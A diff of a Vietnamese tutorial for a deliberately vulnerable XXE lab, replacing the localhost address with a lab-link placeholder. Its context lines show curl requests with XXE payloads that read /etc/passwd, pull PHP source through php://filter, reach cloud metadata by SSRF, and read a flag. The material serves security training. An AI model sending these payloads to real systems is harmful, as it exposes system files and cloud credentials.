@@ -61,7 +61,10 @@ echo (string)$data->name;
 ```bash
 cd xxe/lab
 docker compose up -d
-# Lab tại: http://localhost:7109
+
+> 💡 **Lấy link lab:** Mở bài học này trên trang **Learning Detail** → bấm **"Truy cập Lab"** để hệ thống cấp link thực tế (VD: `https://vuln.ghedahaui.online/labs-env/...`). Thay `<LAB_ADDRESS>` bằng link đó trong các lệnh dưới đây.
+
+# Lab tại: <LAB_ADDRESS>
 ```
 
 Lab là API nhận XML (giống app lưu "product" hoặc "search") qua `POST /api/parse`, parse XML và trả về trường `name`.
@@ -71,7 +74,7 @@ Lab là API nhận XML (giống app lưu "product" hoặc "search") qua `POST /a
 ### Bước 2: Gửi XML bình thường
 
 ```bash
-$ curl -s http://localhost:7109/api/parse -X POST \
+$ curl -s <LAB_ADDRESS>/api/parse -X POST \
        -H "Content-Type: application/xml" \
        -d '<product><name>Laptop</name><price>999</price></product>'
 {"name":"Laptop"}
@@ -84,7 +87,7 @@ $ curl -s http://localhost:7109/api/parse -X POST \
 ### Bước 3: XXE đọc /etc/passwd
 
 ```bash
-$ curl -s http://localhost:7109/api/parse -X POST \
+$ curl -s <LAB_ADDRESS>/api/parse -X POST \
        -H "Content-Type: application/xml" \
        -d '<?xml version="1.0"?>
            <!DOCTYPE product [
@@ -103,7 +106,7 @@ daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 ### Bước 4: Đọc file có ký tự đặc biệt (php://filter)
 
 ```bash
-$ curl -s http://localhost:7109/api/parse -X POST \
+$ curl -s <LAB_ADDRESS>/api/parse -X POST \
        -H "Content-Type: application/xml" \
        -d '<?xml version="1.0"?>
            <!DOCTYPE product [
@@ -124,7 +127,7 @@ $ echo "PD9waHAgLy8gQVBJIHBhcnNl..." | base64 -d
 ### Bước 5: SSRF — gọi metadata của cloud
 
 ```bash
-$ curl -s http://localhost:7109/api/parse -X POST \
+$ curl -s <LAB_ADDRESS>/api/parse -X POST \
        -H "Content-Type: application/xml" \
        -d '<?xml version="1.0"?>
            <!DOCTYPE product [
@@ -141,7 +144,7 @@ $ curl -s http://localhost:7109/api/parse -X POST \
 ### Bước 6: Đọc flag qua XXE
 
 ```bash
-$ curl -s http://localhost:7109/api/parse -X POST \
+$ curl -s <LAB_ADDRESS>/api/parse -X POST \
        -H "Content-Type: application/xml" \
        -d '<?xml version="1.0"?>
            <!DOCTYPE product [
